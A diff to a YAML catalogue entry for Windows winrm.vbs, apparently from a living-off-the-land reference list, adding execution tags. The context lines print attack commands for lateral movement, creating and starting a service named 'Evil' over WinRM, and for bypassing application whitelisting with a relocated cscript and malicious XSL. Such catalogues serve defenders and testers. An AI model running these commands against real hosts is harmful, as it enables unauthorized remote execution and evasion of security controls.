@@ -11,6 +11,9 @@ Commands:
     Privileges: User
     MitreID: T1216
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
   - Command: 'winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'
     Description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol
     Usecase: Proxy execution
@@ -18,6 +21,9 @@ Commands:
     Privileges: Admin
     MitreID: T1216
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
   - Command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
     Description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.
     Usecase: Execute arbitrary, unsigned code via XSL script
@@ -25,6 +31,9 @@ Commands:
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
 Full_Path:
   - Path: C:\Windows\System32\winrm.vbs
   - Path: C:\Windows\SysWOW64\winrm.vbs
